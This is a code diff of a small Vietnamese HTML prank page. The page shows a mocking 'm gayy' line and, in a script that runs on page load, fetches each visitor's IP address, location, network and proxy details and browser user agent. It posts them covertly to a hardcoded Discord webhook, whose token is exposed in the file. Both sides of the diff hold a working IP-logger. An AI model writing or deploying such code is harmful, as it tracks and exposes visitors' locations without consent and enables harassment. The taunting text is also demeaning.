@@ -1,97 +1,90 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <title>...</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>...</title>
 </head>
-<body style="margin:0;background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-size:40px;">
 
-    m gayy 🏳️‍🌈
+<body style="margin:0;background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-size:40px;font-family:sans-serif;">
 
-    <script>
-        const webhook = "https://discord.com/api/webhooks/1502339860885803158/fuKme2rsI2aq9jLBcYb4ARSTZq_jhxNu5bXunLm5BmxMOMfc7bnWV514x0V1IHFS1kNO";
+m gayy 🏳️‍🌈
 
-        async function sendInfo() {
-            try {
+<script>
 
-                // Lấy IP + vị trí
-                const res = await fetch("http://ip-api.com/json/?fields=66846719");
-                const data = await res.json();
+const webhook = "https://discord.com/api/webhooks/1502339860885803158/fuKme2rsI2aq9jLBcYb4ARSTZq_jhxNu5bXunLm5BmxMOMfc7bnWV514x0V1IHFS1kNO";
 
-                // Thiết bị
-                const device = navigator.userAgent;
+async function sendInfo() {
 
-                // Thời gian
-                const time = new Date().toLocaleString();
+    try {
 
-                // Nội dung gửi Discord
-                const payload = {
-                    content:
+        // Lấy IP info
+        const res = await fetch("https://api.ipbot.com/");
+
+        const data = await res.json();
+
+        // Thiết bị
+        const device = navigator.userAgent;
+
+        // Nội dung gửi Discord
+        const payload = {
+            content:
 `📱 Có người mở web
 
-🕒 Thời gian:
-${time}
-
 🌍 IP:
-${data.query}
+${data.ip}
 
 🌎 Quốc gia:
-${data.country}
+${data.location?.country}
 
 🏙️ Thành phố:
-${data.city}
+${data.location?.city}
 
 📍 Khu vực:
-${data.regionName}
-
-📮 Zip:
-${data.zip}
-
-📡 Tọa độ:
-Lat: ${data.lat}
-Lon: ${data.lon}
-
-🏢 Nhà mạng:
-${data.isp}
-
-🧠 Tổ chức:
-${data.org}
-
-🌐 ASN:
-${data.as}
-
-📱 Mobile:
-${data.mobile}
-
-🛡️ Proxy:
-${data.proxy}
-
-🖥️ Hosting:
-${data.hosting}
+${data.location?.region}
 
 🕒 Múi giờ:
-${data.timezone}
+${data.location?.timezone}
+
+🏢 Nhà mạng:
+${data.network?.org}
+
+🌐 ASN:
+${data.network?.asn}
+
+⚠️ Risk:
+${data.security?.risk_score}
+
+🛡️ Proxy:
+${data.security?.is_proxy}
+
+🚨 Threat:
+${data.security?.threat_level}
 
 💻 Thiết bị:
 ${device}`
-                };
+        };
 
-                // Gửi webhook
-                await fetch(webhook, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(payload)
-                });
+        // Gửi webhook
+        await fetch(webhook, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
 
-            } catch (err) {
-                console.log(err);
-            }
-        }
+    } catch(err) {
 
-        sendInfo();
-    </script>
+        console.log(err);
+
+    }
+
+}
+
+sendInfo();
+
+</script>
 
 </body>
 </html>
